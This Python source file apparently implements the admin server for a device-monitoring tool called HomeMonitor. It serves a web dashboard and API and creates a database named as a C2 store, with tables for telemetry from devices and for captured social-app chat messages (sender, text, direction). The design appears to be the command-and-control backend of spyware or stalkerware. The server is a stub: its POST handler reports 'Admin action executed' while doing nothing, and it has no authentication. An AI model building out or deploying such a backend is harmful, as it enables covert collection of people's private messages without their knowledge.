#!/usr/bin/env python3
"""
HomeMonitor Master Admin Linux Application Server (Python Zero-Dependency Edition)

Runs natively on any Linux machine with Python 3.
Provides:
- Embedded SQLite persistent database (c2_admin_database.db)
- Local HTTP Web Dashboard hosting on port 5467
- Admin REST API endpoints
"""

import http.server
import socketserver
import json
import sqlite3
import os
import sys

PORT = 5467
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
WEB_DIR = os.path.abspath(os.path.join(BASE_DIR, "..", "web-dashboard"))
DB_PATH = os.path.join(BASE_DIR, "c2_admin_database.db")

def init_db():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS admin_telemetry (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            category TEXT,
            content TEXT,
            timestamp LONG
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS admin_social_chat (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            app_key TEXT,
            sender TEXT,
            text_content TEXT,
            direction TEXT,
            timestamp LONG
        )
    """)
    conn.commit()
    conn.close()
    print(f"✅ Linux Admin SQLite Database initialized: {DB_PATH}")

class AdminServerHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=WEB_DIR, **kwargs)

    def do_GET(self):
        if self.path.startswith("/api/admin/"):
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()

            if self.path == "/api/admin/status":
                payload = {"status": "ACTIVE", "role": "MASTER_ADMIN", "server": "Python Linux Admin Server", "port": PORT}
                self.wfile.write(json.dumps(payload).encode("utf-8"))
            elif self.path == "/api/admin/telemetry":
                conn = sqlite3.connect(DB_PATH)
                cursor = conn.cursor()
                cursor.execute("SELECT id, device_id, category, content, timestamp FROM admin_telemetry ORDER BY id DESC LIMIT 50")
                rows = cursor.fetchall()
                conn.close()
                res = [{"id": r[0], "deviceId": r[1], "category": r[2], "content": r[3], "timestamp": r[4]} for r in rows]
                self.wfile.write(json.dumps({"count": len(res), "items": res}).encode("utf-8"))
            else:
                self.wfile.write(json.dumps({"message": "Linux Admin API operational"}).encode("utf-8"))
            return

        super().do_GET()

    def do_POST(self):
        if self.path.startswith("/api/admin/"):
            content_length = int(self.headers.get("Content-Length", 0))
            body_bytes = self.rfile.read(content_length)
            body_str = body_bytes.decode("utf-8") if body_bytes else "{}"

            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()

            payload = {"status": "ok", "message": "Admin action executed", "received": body_str}
            self.wfile.write(json.dumps(payload).encode("utf-8"))
            return

        super().do_POST()

if __name__ == "__main__":
    init_db()
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("", PORT), AdminServerHandler) as httpd:
        print("============================================================")
        print(f"🚀 HomeMonitor Master Admin Linux Server App Running!")
        print(f"🌐 Dashboard URL: http://localhost:{PORT}")
        print(f"📁 Linux Local Database: {DB_PATH}")
        print("============================================================")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n🛑 Linux Admin App Server stopped.")
            sys.exit(0)
